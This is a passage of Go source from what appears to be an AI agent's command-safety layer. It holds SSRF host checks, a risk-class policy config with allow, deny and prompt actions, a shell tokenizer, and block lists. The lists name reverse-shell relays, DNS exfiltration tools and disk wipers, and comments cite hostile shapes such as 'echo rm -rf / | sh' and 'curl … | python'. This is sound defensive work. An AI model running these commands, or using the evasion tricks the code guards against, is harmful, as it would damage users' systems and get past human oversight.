		case ip[0] == 0x00 && ip[1] == 0x64 && ip[2] == 0xff && ip[3] == 0x9b && ip[4] == 0x00 && ip[5] == 0x01:
			// 64:ff9b:1::/48 local-use NAT64 (RFC 8215) embeds the IPv4
			// address at a prefix-length-dependent offset; refuse the range.
			return true
		case ip[0] == 0x20 && ip[1] == 0x02:
			// 6to4 2002::/16: bits 16..47 are the IPv4 address of the
			// tunnel endpoint the packet is delivered to.
			return IsBlockedIP(net.IP(append([]byte(nil), ip[2:6]...)))
		}
	}
	return false
}

// ipBytesAllZero reports whether every byte of b is zero.
func ipBytesAllZero(b []byte) bool {
	for _, c := range b {
		if c != 0 {
			return false
		}
	}
	return true
}

// hostnameIsInternal reports whether a non-IP hostname denotes a well-known
// loopback/internal name or a private suffix that must classify as SystemWrite.
// Matching is case-insensitive.
func hostnameIsInternal(host string) bool {
	// A trailing dot is the absolute spelling of the same name.
	hostLower := strings.TrimSuffix(strings.ToLower(host), ".")
	// RFC 6761: every name under .localhost resolves to loopback.
	if strings.HasSuffix(hostLower, ".localhost") {
		return true
	}
	switch hostLower {
	case "localhost", "localhost.localdomain", "localhost6", "localhost6.localdomain6",
		"ip6-localhost", "ip6-loopback":
		return true
	}
	// *.local (mDNS) resolves to link-local.
	if strings.HasSuffix(hostLower, ".local") {
		return true
	}
	// Common cloud metadata endpoints (SSRF targets) and private TLDs.
	if hostLower == "169.254.169.254" || hostLower == "[fd00:ec2::254]" ||
		hostLower == "metadata.google.internal" ||
		hostLower == "metadata.internal" ||
		strings.HasSuffix(hostLower, ".internal") {
		return true
	}
	// Docker internal hostnames.
	if strings.HasSuffix(hostLower, ".docker.internal") {
		return true
	}
	return false
}

// HostIsImplicitlyInternal reports whether the literal host string already
// resolves to an internal target by inspection alone — i.e. ClassifyURL returns
// SystemWrite for it with no DNS lookup (a literal internal IP, in any browser
// encoding, or a known-internal hostname). The dial-time SSRF guard uses this
// to tell apart a target that was *already* surfaced to the policy gate as
// internal (and dialed under that decision) from one that presented as external
// and must be re-validated against its resolved IPs.
func HostIsImplicitlyInternal(host string) bool {
	if ip := parseBrowserIP(host); ip != nil {
		return IsBlockedIP(ip)
	}
	return hostnameIsInternal(host)
}

// parseBrowserIP parses an IP address using the same rules browsers use
// (inet_aton-style), handling representations that Go's net.ParseIP doesn't:
//   - Octal: 0177.0.0.1
//   - Hex:   0x7f000001, 0x0.0x0.0x0.0x0
//   - Integer: 2130706433
//   - Short:  127.1
func parseBrowserIP(host string) net.IP {
	// Try standard parse first (handles IPv6, dotted decimal, etc.)
	if ip := net.ParseIP(host); ip != nil {
		return ip
	}

	// Try inet_aton-style parsing for IPv4 with non-standard representations
	parts := strings.Split(host, ".")
	if len(parts) < 1 || len(parts) > 4 {
		return nil
	}

	var nums []uint32
	for _, p := range parts {
		var val uint64
		var err error
		switch {
		case strings.HasPrefix(p, "0x") || strings.HasPrefix(p, "0X"):
			val, err = strconv.ParseUint(p[2:], 16, 32)
		case strings.HasPrefix(p, "0") && len(p) > 1:
			// Only octal if it starts with 0 and has more digits
			// Single "0" is just decimal zero
			val, err = strconv.ParseUint(p[1:], 8, 32)
		default:
			val, err = strconv.ParseUint(p, 10, 32)
		}
		if err != nil || val > 0xFFFFFFFF {
			return nil
		}
		nums = append(nums, uint32(val))
	}

	// inet_aton requires every leading part to fit in one byte and the final
	// part to fit in the remaining bytes (a.b → b ≤ 0xFFFFFF, a.b.c →
	// c ≤ 0xFFFF, a.b.c.d → d ≤ 0xFF). Reject out-of-range parts instead of
	// silently truncating them — "300.1.1.1" must not parse as 44.1.1.1 and
	// mislead the internal-IP checks downstream.
	for i, n := range nums {
		max := uint64(0xFF)
		if i == len(nums)-1 {
			max = (uint64(1) << (8 * uint(5-len(nums)))) - 1
		}
		if uint64(n) > max {
			return nil
		}
	}

	// Assemble the 32-bit address from the bounded parts, then split it
	// into octets without narrowing conversions: a single number is the
	// whole address, a.b puts b in the low 24 bits, a.b.c puts c in the low
	// 16 bits, and a.b.c.d is one octet per part.
	var addr uint32
	switch len(nums) {
	case 1:
		addr = nums[0]
	case 2:
		addr = nums[0]<<24 | nums[1]
	case 3:
		addr = nums[0]<<24 | nums[1]<<16 | nums[2]
	case 4:
		addr = nums[0]<<24 | nums[1]<<16 | nums[2]<<8 | nums[3]
	default:
		return nil
	}
	octets := make([]byte, 4)
	binary.BigEndian.PutUint32(octets, addr)
	return net.IPv4(octets[0], octets[1], octets[2], octets[3])
}

// ── Config ─────────────────────────────────────────────────────────────

// DangerousConfig defines how dangerous operations are handled.
// Configurable via the standard 4-layer odek config chain.
//
// Default behavior per class (no sandbox):
//
//	safe → allow, local_write → allow, system_write → prompt,
//	destructive → deny, network_egress → prompt,
//	code_execution → prompt, install → prompt, blocked → deny,
//	unknown → deny
//
// The classifier fails closed: a command whose program name is not
// recognised classifies as Unknown and is denied by default. Set
// "unknown": "prompt" (or add trusted tools to the allowlist) to soften
// this for a given profile.
type DangerousConfig struct {
	// Classes maps risk classes to their configured action.
	// Only overrides for non-default values need to be set.
	Classes map[RiskClass]Action `json:"classes,omitempty"`

	// Allowlist is a list of command strings that are always allowed,
	// regardless of their risk classification. Exact match only.
	// Takes priority over Denylist.
	Allowlist []string `json:"allowlist,omitempty"`

	// Denylist is a list of command strings that are always denied,
	// regardless of their risk classification. Each entry is matched as a
	// token prefix against every command the line would run (chain segments,
	// pipe stages, wrapper-stripped commands, git without global options,
	// shell -c payloads and substitution bodies).
	Denylist []string `json:"denylist,omitempty"`

	// DefaultAction is the global default action applied to ALL risk classes
	// when set. Per-class overrides in Classes still win.
	// "allow" → YOLO mode (everything runs without prompt)
	// "deny" → lockdown (everything denied unless explicitly allowed)
	// Not set → uses built-in defaults per class
	DefaultAction *string `json:"action,omitempty"`

	// NonInteractive specifies what to do when running without a TTY.
	// "read_only" (default) — read-only inspection proceeds, writes/exec/
	// egress are denied; "deny" — block all prompted ops; "allow" — run
	// everything. The read_only default keeps headless/CI usage useful
	// enough that flipping to "allow" is never the path of least
	// resistance: under deny, an agent under a restrictive posture
	// cannot even `ls`, and containment via inability just gets turned off.
	NonInteractive *string `json:"non_interactive,omitempty"`

	// Approver handles interactive approval prompts for dangerous operations.
	// When set, all Prompt-class operations use this instead of /dev/tty.
	// Tools can inject their own approver (e.g., WebSocket-based for odek serve).
	// When nil, CheckOperation falls back to /dev/tty (CLI-compatible default).
	Approver Approver `json:"-"`

	// StripSecretsEnvChildren, when true, strips secrets.env names from the
	// environment of host-mode child processes spawned by the shell tool
	// and background jobs (sub-agents and MCP stdio spawns already strip
	// unconditionally). Default false: children inherit, preserving
	// operator workflows that legitimately need credentials in shell
	// children (gh, curl). Operator-only: the project config's dangerous
	// section is ignored by design.
	StripSecretsEnvChildren *bool `json:"strip_secrets_env_children,omitempty"`

	// RESTApprovalFriction, when true, requires a typed `confirm` field
	// matching the action on approve/trust decisions submitted through the
	// headless REST approval bridge (POST /api/runs/{id}/approvals/{aid})
	// — the server-side friction the bridge otherwise lacks. Default
	// false: auto-approving clients (bodek) keep the single-field
	// contract. Deny stays single-field: friction protects against
	// accidental approvals, not denials.
	RESTApprovalFriction *bool `json:"rest_approval_friction,omitempty"`
}

// StripSecretsEnvChildrenEnabled reports whether host-mode shell/bg
// children must have secrets.env names stripped from their env. Nil-safe.
func (c *DangerousConfig) StripSecretsEnvChildrenEnabled() bool {
	return c != nil && c.StripSecretsEnvChildren != nil && *c.StripSecretsEnvChildren
}

// RESTApprovalFrictionEnabled reports whether the REST approval bridge must
// require a typed confirm field on approve/trust decisions. Nil-safe.
func (c *DangerousConfig) RESTApprovalFrictionEnabled() bool {
	return c != nil && c.RESTApprovalFriction != nil && *c.RESTApprovalFriction
}

// defaultActions defines the base per-class behavior.
var defaultActions = map[RiskClass]Action{
	Safe:          Allow,
	LocalWrite:    Allow,
	SystemWrite:   Prompt,
	Persistence:   Prompt,
	UnreadExec:    Prompt,
	Destructive:   Deny,
	NetworkEgress: Allow,
	NetworkUpload: Prompt,
	CodeExecution: Prompt,
	Install:       Prompt,
	Blocked:       Deny,
	// Unrecognised commands fail closed — denied by default, like
	// Destructive. Override per-profile (e.g. "unknown": "prompt") or via
	// the allowlist for tools you trust.
	Unknown: Deny,
}

// ActionFor returns the configured action for the given risk class.
// Per-class overrides in Classes win first, then the global default
// action (the "action" field), then built-in defaults. Unknown enum values deny.
func (c *DangerousConfig) ActionFor(cls RiskClass) Action {
	if !ValidRiskClass(cls) || c.Validate() != nil {
		return Deny
	}
	if cls == Blocked {
		return Deny
	}
	// If the user explicitly configured an action for this class, use it.
	if c != nil && c.Classes != nil {
		if a, ok := c.Classes[cls]; ok {
			return a
		}
	}
	// Global default action overrides all built-in defaults.
	// Set "action": "allow" for YOLO mode, "action": "deny" for lockdown.
	if c != nil && c.DefaultAction != nil {
		return parseAction(*c.DefaultAction)
	}
	// Fallback to built-in defaults
	if a, ok := defaultActions[cls]; ok {
		return a
	}
	return Deny
}

// ValidRiskClass reports whether a policy key names a supported class.
func ValidRiskClass(cls RiskClass) bool {
	_, ok := defaultActions[cls]
	return ok
}

// Validate rejects malformed policy instead of silently falling back to a
// weaker default. Direct API construction uses this same validation gate.
func (c *DangerousConfig) Validate() error {
	if c == nil {
		return nil
	}
	for cls, action := range c.Classes {
		if !ValidRiskClass(cls) {
			return fmt.Errorf("unknown risk class %q", cls)
		}
		if action != Allow && action != Deny && action != Prompt {
			return fmt.Errorf("invalid action %q for risk class %q", action, cls)
		}
		if cls == Blocked && action != Deny {
			return fmt.Errorf("blocked operations must remain denied")
		}
	}
	if c.DefaultAction != nil {
		switch strings.ToLower(strings.TrimSpace(*c.DefaultAction)) {
		case "allow", "deny", "prompt":
		default:
			return fmt.Errorf("invalid default action %q", *c.DefaultAction)
		}
	}
	if c.NonInteractive != nil {
		if _, ok := ParseNonInteractiveAction(*c.NonInteractive); !ok {
			return fmt.Errorf("invalid non_interactive action %q", *c.NonInteractive)
		}
	}
	return nil
}

// ActionForCommand returns the action for a specific command string.
// Allowlist and denylist are checked first (exact match for allowlist,
// token-prefix match at every command position for denylist), then falls back
// to the risk-class-based action.
func (c *DangerousConfig) ActionForCommand(cmd string) Action {
	if c.Validate() != nil {
		return Deny
	}
	if len(cmd) > MaxCommandBytes {
		return Deny
	}
	trimmed := strings.TrimSpace(cmd)
	if trimmed == "" {
		return Allow
	}
	// Keep escaped whitespace intact during analysis; trimming it can change
	// the executable word while allowlist matching still trims whole entries.
	analysis := Analyze(cmd)
	cmd = trimmed
	// Full blocked classification runs before every list check: even an exact
	// allowlist entry must not re-arm a fork bomb or other blocked shape.
	if analysis.Class() == Blocked {
		return Deny
	}
	// Allowlist has highest priority — exact match after trimming both sides.
	for _, pattern := range c.Allowlist {
		if cmd == strings.TrimSpace(pattern) {
			return Allow
		}
	}
	// Denylist is checked before classification — a token-prefix match against
	// every command position (see denylistMatch), so neither extra whitespace
	// nor a chain, wrapper, git global option or -c payload hides a match.
	if denylistMatch(cmd, c.Denylist) {
		return Deny
	}
	// Classify and use class-based action
	action := Allow
	for _, cls := range analysis.Effects {
		action = stricterAction(action, c.ActionFor(cls))
	}
	return action
}

// NonInteractiveAction returns the action to use when no TTY is available.
//
// Unset → ReadOnly: read-only inspection proceeds, every mutation
// fails closed — useful enough that flipping to "allow" is never the path
// of least resistance.
//
// An explicitly set but INVALID value fails closed to Deny: a typo must
// never silently loosen the gate.
func (c *DangerousConfig) NonInteractiveAction() Action {
	if c != nil && c.NonInteractive != nil {
		action, ok := ParseNonInteractiveAction(*c.NonInteractive)
		if ok {
			return action
		}
		return Deny
	}
	return ReadOnly
}

// ParseNonInteractiveAction parses the non_interactive config value. It
// accepts "allow", "deny", and "read_only"; "prompt" and any other value
// are rejected because prompting is impossible without a TTY.
func ParseNonInteractiveAction(s string) (Action, bool) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "allow":
		return Allow, true
	case "deny":
		return Deny, true
	case "read_only":
		return ReadOnly, true
	default:
		return Deny, false
	}
}

// CheckOperation checks whether a tool operation is allowed, denied,
// or needs approval. Returns nil on allow, error on deny, and prompts
// the user on prompt. Uses the configured Approver when set; falls back
// to /dev/tty (TTYApprover) when no approver is configured.
func (c *DangerousConfig) CheckOperation(op ToolOperation, trustedClasses map[RiskClass]bool) error {
	action := c.ActionFor(op.Risk)
	switch action {
	case Allow:
		return nil
	case Deny:
		return fmt.Errorf("operation denied by configuration: %s %s (risk: %s)",
			SanitizeInline(op.Name), SanitizeInline(op.Resource), op.Risk)
	case Prompt:
		// Use configured approver, or fall back to TTY
		var approver Approver
		if c != nil {
			approver = c.Approver
		}
		if approver == nil {
			approver = NewTTYApprover(c)
		}
		// Build a TTYApprover for trustedClasses tracking if needed.
		// The swap must go through SetTrustedClasses (a.mu): parallel tool
		// calls read TrustedClasses under that same mutex, and an unguarded
		// store here races with them (flagged by go test -race).
		if tty, ok := approver.(*TTYApprover); ok && trustedClasses != nil {
			tty.SetTrustedClasses(trustedClasses)
		}
		return approver.PromptOperation(op)
	default:
		return fmt.Errorf("invalid policy action %q: operation denied", action)
	}
}

func parseAction(s string) Action {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "allow":
		return Allow
	case "deny":
		return Deny
	case "prompt":
		return Prompt
	default:
		return Deny
	}
}

// ── Tokenizer ──────────────────────────────────────────────────────────

// tokenize splits a shell command into tokens, respecting:
//   - Single and double quotes (content preserved as-is)
//   - Pipes (|), redirects (>, >>), compound (&&, ||, ;)
//   - Newlines mapped to semicolons (command separators)
//
// Output: flattened token slice including operators as tokens.
func tokenize(input string) []string {
	tokens, _ := tokenizeChecked(input)
	return tokens
}

// tokenizeChecked is tokenize that also reports whether a quote was still
// open at the end of the input. A real shell rejects such a line outright, so
// nothing in it runs; the tokenizer, however, folds the rest of the line into
// one quoted word, which hides every operator and command after the opening
// quote. Callers that gate execution treat the report as unanalysable.
func tokenizeChecked(input string) ([]string, bool) {
	tokens, _, unterminated := tokenizeMarked(input)
	return tokens, unterminated
}

// tokenizeMarked is tokenizeChecked that also reports, for each token,
// whether it is an operator written outside quotes. A quoted ")" is a word
// that happens to look like the closing parenthesis of a subshell.
func tokenizeMarked(input string) ([]string, []bool, bool) {
	input = strings.TrimSpace(input)
	if input == "" {
		return nil, nil, false
	}

	// Normalize newlines to semicolons. lineBreak remembers which semicolons
	// stand for a line break: a blank line must stay two separators and never
	// merge into the case terminator ";;".
	lineBreak := make([]bool, 0, len(input))
	{
		var b strings.Builder
		b.Grow(len(input))
		for i := 0; i < len(input); i++ {
			c := input[i]
			if c == '\r' && i+1 < len(input) && input[i+1] == '\n' {
				i++
				c = '\n'
			}
			if c == '\n' || c == '\r' {
				b.WriteByte(';')
				lineBreak = append(lineBreak, true)
				continue
			}
			b.WriteByte(c)
			lineBreak = append(lineBreak, false)
		}
		input = b.String()
	}

	var tokens []string
	var ops []bool
	var current strings.Builder
	inSingle := false
	inDouble := false
	escapeNext := false
	// parenLit counts parentheses kept inside a word (array literals,
	// extended globs, an unterminated $( ), and paramDepth the open ${ }
	// expansions; neither kind of parenthesis is a shell operator.
	parenLit, paramDepth := 0, 0
	// arithBudget bounds the characters examined looking for the end of
	// "((" openers, so a run of them cannot make the scan quadratic.
	arithBudget := 4*len(input) + 1024

	flush := func() {
		if current.Len() > 0 {
			tokens = append(tokens, current.String())
			ops = append(ops, false)
			current.Reset()
		}
	}
	emit := func(op string) {
		tokens = append(tokens, op)
		ops = append(ops, true)
	}

	for i := 0; i < len(input); i++ {
		ch := input[i]

		if escapeNext {
			current.WriteByte(ch)
			escapeNext = false
			continue
		}

		// Outside quotes an escaped quote or backslash is the literal
		// character, never a quote opener or the start of another escape.
		if ch == '\\' && !inSingle && !inDouble && i+1 < len(input) &&
			(input[i+1] == '\'' || input[i+1] == '"' || input[i+1] == '\\') {
			current.WriteByte(input[i+1])
			i++
			continue
		}

		if ch == '\\' && inDouble {
			// In double quotes, \ escapes \, ", $, `, and newline
			next := i + 1
			if next < len(input) {
				switch input[next] {
				case '\\', '"', '$', '`':
					escapeNext = true
					continue
				case '\n':
					i++ // skip newline
					continue
				}
			}
			current.WriteByte(ch)
			continue
		}

		if ch == '\'' && !inDouble {
			// Toggle quote state WITHOUT flushing. A quote boundary is not a
			// word boundary in a shell: r''m and "rm" both denote the single
			// word `rm`. Flushing here split them into r,m — letting an
			// attacker hide a command name from prefix matching. Words are
			// only broken on unquoted whitespace/operators (handled below).
			inSingle = !inSingle
			continue
		}

		if ch == '"' && !inSingle {
			inDouble = !inDouble
			continue
		}

		if inSingle || inDouble {
			current.WriteByte(ch)
			continue
		}

		// Outside quotes — handle operators and whitespace
		if ch == ' ' || ch == '\t' {
			flush()
			continue
		}

		// An escaped parenthesis is a literal character of the word.
		if ch == '\\' && i+1 < len(input) && (input[i+1] == '(' || input[i+1] == ')') {
			current.WriteByte(ch)
			current.WriteByte(input[i+1])
			i++
			continue
		}

		// Parentheses delimit subshells, function definitions and case
		// patterns. Inside a word they belong to it: an array literal
		// (a=(1 2)), an extended glob (!(x), @(x|y)) or a ${ } expansion.
		if ch == '$' && i+1 < len(input) && input[i+1] == '{' {
			paramDepth++
			current.WriteString("${")
			i++
			continue
		}
		if paramDepth > 0 && ch == '}' {
			paramDepth--
			current.WriteByte(ch)
			continue
		}
		if ch == '(' || ch == ')' {
			if paramDepth > 0 || parenLit > 0 || (ch == '(' && current.Len() > 0 && i > 0 && strings.IndexByte("=!+@*?$", input[i-1]) >= 0) {
				if paramDepth == 0 {
					if ch == '(' {
						parenLit++
					} else {
						parenLit--
					}
				}
				current.WriteByte(ch)
				continue
			}
			flush()
			if ch == '(' && i+1 < len(input) && input[i+1] == '(' && commandPosition(tokens) {
				if end, ok := arithmeticEnd(input, i+2, &arithBudget); ok {
					emit("((" + input[i+2:end] + "))")
					i = end + 1
					continue
				}
			}
			emit(string(ch))
			continue
		}

		// Multi-char operators. Every form containing a bare `&` must be
		// matched before the single-char `&` case below, and `&` itself must
		// be an operator: a lone ampersand backgrounds the preceding command
		// and starts a new one (`cat a & curl …`), so treating it as a word
		// character hides everything after it from classification. The
		// redirection spellings (fd duplication and bash's both-stream
		// forms) stay single tokens so they are not mistaken for separators.
		if i+2 < len(input) && (ch != ';' || !lineBreak[i] && !lineBreak[i+1] && !lineBreak[i+2]) {
			switch op3 := input[i : i+3]; op3 {
			case ">>&", "&>>", "<<<", ";;&":
				flush()
				emit(op3)
				i += 2
				continue
			}
		}
		if i+1 < len(input) && (ch != ';' || !lineBreak[i] && !lineBreak[i+1]) {
			op2 := string(input[i]) + string(input[i+1])
			switch op2 {
			case "&&", "||", ">>", ">&", "&>", "|&", "<<", ">|", "<&", ";;", ";&":
				flush()
				emit(op2)
				i++
				continue
			}
		}

		// Single-char operators: |, >, ;, &, <
		// `<` must be an operator so here-strings and file redirects
		// (`xargs rm -rf <<</`, `xargs rm -rf < paths`) are not glued
		// onto the following path as a single non-wipe token.
		switch ch {
		case '|', '>', ';', '&', '<':
			flush()
			emit(string(ch))
			continue
		}

		// Regular character
		current.WriteByte(ch)
	}

	flush()
	return tokens, ops, inSingle || inDouble
}

// commandPosition reports whether the next word of a token stream would start
// a command: at the beginning, after a separator, after an opening bracket or
// after a keyword that introduces a command list.
func commandPosition(tokens []string) bool {
	if len(tokens) == 0 {
		return true
	}
	switch tokens[len(tokens)-1] {
	case ";", "&&", "||", "&", "|", "|&", "(", ")", "{", "!", ";;", ";&", ";;&",
		"then", "do", "else", "elif", "if", "while", "until", "for", "time", "coproc":
		return true
	}
	return false
}

// arithmeticEnd finds the "))" that closes an arithmetic command whose body
// starts at input[start:], returning the index of the first closing
// parenthesis. Like the shell it balances nested parentheses and skips quoted
// text; a ")" that closes at depth zero without a second ")" right behind it
// means the "((" was really two nested subshells, so it reports false.
func arithmeticEnd(input string, start int, budget *int) (int, bool) {
	depth := 0
	for j := start; j < len(input); j++ {
		if *budget--; *budget < 0 {
			return 0, false
		}
		switch input[j] {
		case '\\':
			j++
		case '\'':
			k := strings.IndexByte(input[j+1:], '\'')
			if k < 0 {
				return 0, false
			}
			if *budget -= k; *budget < 0 {
				return 0, false
			}
			j += k + 1
		case '"':
			j++
			for j < len(input) && input[j] != '"' {
				if *budget--; *budget < 0 {
					return 0, false
				}
				if input[j] == '\\' {
					j++
				}
				j++
			}
		case '(':
			depth++
		case ')':
			if depth > 0 {
				depth--
				continue
			}
			if j+1 < len(input) && input[j+1] == ')' {
				return j, true
			}
			return 0, false
		}
	}
	return 0, false
}

// ── Write command prefixes ─────────────────────────────────────────────
// Not consulted for default fall-through (classification defaults to Safe
// when nothing matches); these gate verbs that write to the filesystem.

var writePrefixes = map[string]bool{
	// echo is deliberately absent: without a redirect it only prints, and
	// treating its operands as write targets made `echo /etc/passwd` and
	// `echo rm -rf / | sh` escalate as system_write. Redirected echo is
	// still a write via isLocalWrite / the redirect scan in isSystemWrite.
	"sed": true, "tee": true,
	"rm": true, "mv": true, "cp": true, "touch": true,
	"mkdir": true, "rmdir": true, "chmod": true, "chown": true,
	// ln / install / chgrp were special-cased for system-path escalation
	// but missing here, so a workspace `ln -s a b` fell through to
	// unknown (deny). They are ordinary local writes; the operand scan
	// still promotes a system or persistence target.
	"ln": true, "install": true, "chgrp": true,
	// Archive tools write extracted/compressed files. List-only forms
	// (`tar -t`, `unzip -l`) still allow — same action as local_write —
	// instead of unknown-deny. `--to-command` / `-I` escalate in
	// isCodeExecution before this set is consulted.
	"tar": true, "unzip": true, "zip": true,
	"gzip": true, "gunzip": true, "pigz": true,
	"xz": true, "unxz": true, "bzip2": true, "bunzip2": true,
	"zstd": true, "unzstd": true, "7z": true, "7za": true,
	"unrar": true, "unar": true, "cpio": true, "jar": true,
	"patch": true, "strip": true, "ssh-keygen": true,
	"pandoc": true, "ffmpeg": true, "convert": true, "magick": true,
	"mktemp": true, "truncate": true, "fallocate": true,
	"dos2unix": true, "unix2dos": true,
	// chattr mutates file attributes (including the immutable flag) the same
	// way chmod mutates permissions; recursive use at a system root is
	// escalated by the same operand scan, and formerly it fell through to
	// Unknown.
	"chattr": true,
	// shred overwrites/removes files like rm. isDestructive escalates it to
	// destructive when aimed at a block device or catastrophic wipe target;
	// otherwise a local-file shred is a write (local_write / system_write).
	"shred": true,
}

// displayVerbs only print their operands. Path-shaped arguments are not
// opened unless there is an output redirect, so resource/system-path
// scans skip them (`echo /etc/passwd`, `printf ~/.ssh/id_rsa`).
var displayVerbs = map[string]bool{
	"echo": true, "printf": true,
}

// projectExecCommands run project-defined recipes/tests (Makefiles,
// pytest) and are code_execution — the same class as `npm test` — rather
// than unknown (deny). They must NOT be added to safeCommands.
var projectExecCommands = map[string]bool{
	"make": true, "gmake": true, "pytest": true, "py.test": true,
	"just": true, "task": true, "jest": true, "vitest": true,
	"bazel": true, "rake": true, "mix": true,
}

var systemPrefixes = map[string]bool{
	"sudo": true, "systemctl": true, "service": true,
	"useradd": true, "groupadd": true, "passwd": true,
}

var destructivePrefixes = map[string]bool{
	"dd": true, "mkfs": true, "mkfs.ext4": true, "mkfs.ext3": true,
	"mkfs.ext2": true, "mkfs.xfs": true, "mkfs.btrfs": true,
	"mkfs.vfat": true, "mkfs.fat": true, "mkfs.ntfs": true, "mkfs.f2fs": true,
	"fdisk": true, "parted": true, "mke2fs": true,
	// Partition-table and filesystem-signature destroyers. Each operates on a
	// whole disk/partition and is unrecoverable, so any invocation is treated
	// as destructive (deny-by-default, overridable in godmode for legitimate
	// disk work) — matching the existing mkfs/fdisk handling.
	"sgdisk": true, "gdisk": true, "cfdisk": true, "sfdisk": true,
	"wipefs": true, "blkdiscard": true, "mkswap": true, "badblocks": true,
	"cryptsetup": true, "zerofree": true,
}

var networkPrefixes = map[string]bool{
	"curl": true, "wget": true, "scp": true, "rsync": true,
	"nc": true, "ncat": true, "ssh": true, "sftp": true,
	"ftp": true, "tftp": true, "telnet": true, "git": true,
	// gh is the GitHub CLI: every real gh subcommand talks to the GitHub API.
	// Its verbs are classified individually (see classifyGH).
	"gh": true,
	// reverse-shell / tunnelling relays
	"socat": true, "rclone": true,
	// DNS lookups double as exfiltration channels
	"dig": true, "nslookup": true, "host": true, "drill": true,
	"ping": true, "ping6": true, "traceroute": true, "traceroute6": true,
	"openssl":   true,
	"redis-cli": true, "psql": true, "mysql": true, "pg_isready": true,
	// other downloaders
	"aria2c": true, "axel": true, "httpie": true,
}

var pipedShells = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "fish": true, "dash": true, "ksh": true,
	"ash": true,
}

// embeddedShellInterpreters are programs whose payload (script, expression,
// or file operand) can invoke arbitrary shell commands. They are treated like
// script interpreters: a bare --version/--help query stays safe, but any other
// invocation that supplies code or a file is code execution.
var embeddedShellInterpreters = map[string]bool{
	"awk": true, "gawk": true, "mawk": true, "nawk": true,
	"ed": true, "ex": true,
	"vi": true, "vim": true, "nvim": true, "view": true,
	"emacs": true, "emacsclient": true,
}

var codeEvalPrefixes = map[string]bool{
	"eval": true, "node": true, "python": true, "python3": true,
	"perl": true, "ruby": true, "php": true,
	"java": true,
}

// stdinExecInterpreters read and execute a program from standard input when no
// script file is given (`curl … | python`, `… | perl`, `… | node`). Fed by an
// upstream pipe they are code execution, the non-shell analogue of `… | bash`.
// Kept separate from codeEvalPrefixes because that set includes the `eval`
// builtin, which is not a program a pipe can feed into.
var stdinExecInterpreters = map[string]bool{
	"node": true, "python": true, "python3": true,
	"perl": true, "ruby": true, "php": true,
	// Runtime CLIs that execute a program from stdin when fed a pipe.
	// bun was previously only an install/run prefix, so `cat pwn.js | bun`
	// classified Safe (auto-allow).
	"bun": true, "deno": true,
	"lua": true, "luajit": true,
	"osascript": true,
	"ipython":   true,
}

// remoteRunPrefixes fetch and execute a (possibly remote) package or script
// in one shot — code execution, not a plain install.
var remoteRunPrefixes = map[string]bool{
	"npx": true, "bunx": true, "uvx": true, "pipx": true,
}

var installPrefixes = map[string]bool{
	"npm": true, "pip": true, "pip3": true, "gem": true,
	"cargo": true, "brew": true, "go": true,
	"pnpm": true, "yarn": true, "bun": true, "apk": true,
	"uv":  true,
	"apt": true, "apt-get": true, "yum": true, "dnf": true,
	"dpkg":   true,
	"poetry": true, "pipenv": true, "bundle": true, "composer": true,
	"rustup": true,
	"nvm":    true, "fnm": true, "pyenv": true, "rbenv": true,
	"nodenv": true, "asdf": true,
}

// pkgRunSubcommands identifies project-script invocation. Compile/test
// runners and plugin-loading toolchains are handled by adapterRunsCode,
// retaining execution policy even when their ordinary use is routine.
var pkgRunSubcommands = map[string]map[string]bool{
	"npm":      {"start": true, "run": true, "run-script": true, "test": true, "stop": true, "restart": true, "exec": true},
	"pnpm":     {"start": true, "run": true, "test": true, "exec": true},
	"yarn":     {"start": true, "run": true, "test": true, "exec": true},
	"bun":      {"start": true, "run": true, "test": true, "exec": true},
	"cargo":    {"run": true, "bench": true},
	"poetry":   {"run": true, "shell": true},
	"pipenv":   {"run": true, "shell": true},
	"bundle":   {"exec": true},
	"composer": {"run": true, "run-script": true, "exec": true, "test": true},
}

// safeCommands registers tools with benign forms. Execution, mutation,
// output-target and sensitive-resource adapters run before this fallback.
// Adding a tool here requires reviewing its helper and configuration routes.
var safeCommands = map[string]bool{
	// listing / reading files
	"ls": true, "ll": true, "dir": true, "vdir": true, "cat": true, "tac": true,
	"head": true, "tail": true, "less": true, "more": true, "bat": true,
	"nl": true, "wc": true, "file": true, "stat": true, "readlink": true,
	"realpath": true, "basename": true, "dirname": true, "tree": true,
	"du": true, "df": true, "find": true, "locate": true, "mdfind": true,
	// text transforms (stdin→stdout; a > redirect escalates to LocalWrite)
	"grep": true, "egrep": true, "fgrep": true, "rg": true, "ag": true, "ack": true,
	"sort": true, "uniq": true, "cut": true, "paste": true, "column": true,
	"fold": true, "comm": true, "join": true, "look": true, "tr": true,
	"expand": true, "unexpand": true, "fmt": true, "pr": true, "rev": true,
	"diff": true, "cmp": true, "sdiff": true, "colordiff": true, "diffstat": true,
	"jq": true, "yq": true, "xmllint": true, "csvlook": true,
	// hashing / encoding (read-only inspection)
	"strings": true, "od": true, "hexdump": true, "xxd": true,
	"base32": true, "base64": true, "md5sum": true, "sha1sum": true, "sha256sum": true,
	"sha512sum": true, "cksum": true, "b2sum": true, "sum": true, "shasum": true,
	// system / process inspection
	"pwd": true, "printf": true, "date": true, "cal": true, "uptime": true,
	"uname": true, "arch": true, "hostname": true, "nproc": true, "free": true,
	"vmstat": true, "iostat": true, "mpstat": true, "lscpu": true, "lsblk": true,
	"lsmem": true, "lsusb": true, "lspci": true, "lsof": true, "dmesg": true,
	"id": true, "whoami": true, "groups": true, "users": true, "who": true,
	"w": true, "last": true, "getent": true, "ps": true, "pgrep": true,
	"pidof": true, "netstat": true, "ss": true, "locale": true,
	// Signaling a process is reversible (restart it). kill of pid 1 or
	// broadcast pid -1 still escalates in isSystemWrite.
	"kill": true, "pkill": true, "killall": true,
	"getconf": true, "which": true, "whereis": true, "type": true, "hash": true,
	// control / no-op builtins
	"true": true, "false": true, ":": true, "test": true, "[": true,
	"sleep": true, "seq": true, "yes": true, "expr": true, "echo": true,
	"man": true, "info": true, "tldr": true, "help": true, "clear": true,
	// benign shell builtins (navigation, var/job control; no FS/net/priv).
	// NOTE: eval/source/. are deliberately absent — they execute code and
	// are handled as code_execution.
	"cd": true, "pushd": true, "popd": true, "dirs": true, "export": true,
	"unset": true, "set": true, "read": true, "wait": true, "shift": true,
	"return": true, "exit": true, "trap": true, "umask": true, "getopts": true,
	"local": true, "declare": true, "typeset": true, "readonly": true,
	"alias": true, "unalias": true, "jobs": true, "bg": true, "fg": true,
	"disown": true, "let": true, "ulimit": true, "times": true, "history": true,
	"break": true, "continue": true,
